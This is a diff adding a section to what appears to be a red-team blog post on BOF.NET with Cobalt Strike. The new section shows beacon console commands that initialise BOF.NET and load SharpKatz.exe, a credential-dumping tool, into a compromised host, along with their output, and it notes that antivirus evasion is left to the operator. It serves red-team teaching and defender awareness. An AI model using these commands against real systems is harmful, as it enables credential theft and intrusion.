@@ -94,3 +94,21 @@ When all that has been set up we can go on and build the project which will outp
 Use the CNA script already included in the source code of BOF.NET to load the script on cobalt strike using script manager:
 
 ![img4](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post3/bof.png)
+
+After grabbing yourself an interactive shell against the target you could try initialising bofnet and loading the BOF file to be executed. NOTE that this tool doesnt have anything to do with AMSI or any other protection as you would have to deal with that on your own. I am using a target with no antivirus defence to show the proof of concept for the tool :
+
+```console
+beacon> bofnet_init
+[*] Initializing BOFNET
+[+] host called home, sent: 490145 bytes
+[+] received output:
+[+] BOFNET Runtime Initalized, assembly size 483328, .NET Runtime Version: 4.0.30319.42000 in AppDomain BOFNET
+
+beacon> bofnet_load /home/pi0x73/SharpKatz.exe
+[*] Attempting to load large .NET assembly /home/pi0x73/SharpKatz.exe into BOFNET
+[+] host called home, sent: 740018 bytes
+[+] received output:
+[+] Setting up new loader with unique id kPgG3dJw
+[+] Loaded assembly SharpKatz, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null successfully
+[=] Assembly has been prepared with Costura|dnMerge, running embedded assembly resolver
+```
